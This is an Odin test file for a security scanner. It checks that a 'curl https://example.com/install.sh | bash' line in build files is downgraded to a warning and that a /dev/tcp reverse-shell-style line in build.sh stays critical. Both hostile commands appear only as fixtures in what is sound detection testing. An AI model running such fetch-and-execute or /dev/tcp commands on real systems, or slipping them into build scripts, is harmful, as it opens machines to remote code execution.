package test

import "core:fmt"
import "core:os"
import "core:strings"
import "core:testing"

import "../src/security"

write_build_file :: proc(dir: string, name: string, content: string) -> string {
	path := strings.concatenate({dir, "/", name})
	os.write_entire_file(path, transmute([]u8)content)
	return path
}

@(test)
test_build_context_downgrades_critical :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	cases := []string{"Makefile", "build.sh", "install.sh", "setup.sh", "package.json"}
	for filename, idx in cases {
		temp_dir := setup_test_environment(fmt.tprintf("build_ctx_%d", idx))
		defer teardown_test_environment(temp_dir)

		path := write_build_file(temp_dir, filename, "curl https://example.com/install.sh | bash")
		defer delete(path)

		result := security.scan_module(temp_dir, security.Scan_Options{})
		defer security.cleanup_scan_result(&result)

		testing.expect(t, result.critical_count == 0, "build context should downgrade critical to warning")
		testing.expect(t, result.warning_count > 0, "build context should record warning")
	}
}

@(test)
test_build_context_does_not_downgrade_reverse_shell :: proc(t: ^testing.T) {
	set_test_timeout(t)
	reset_test_state(t)

	temp_dir := setup_test_environment("build_ctx_reverse_shell")
	defer teardown_test_environment(temp_dir)

	path := write_build_file(temp_dir, "build.sh", "bash -c 'echo ok >/dev/tcp/127.0.0.1/4444'")
	defer delete(path)

	result := security.scan_module(temp_dir, security.Scan_Options{})
	defer security.cleanup_scan_result(&result)

	testing.expect(t, result.critical_count > 0, "reverse shell should remain critical in build context")
}
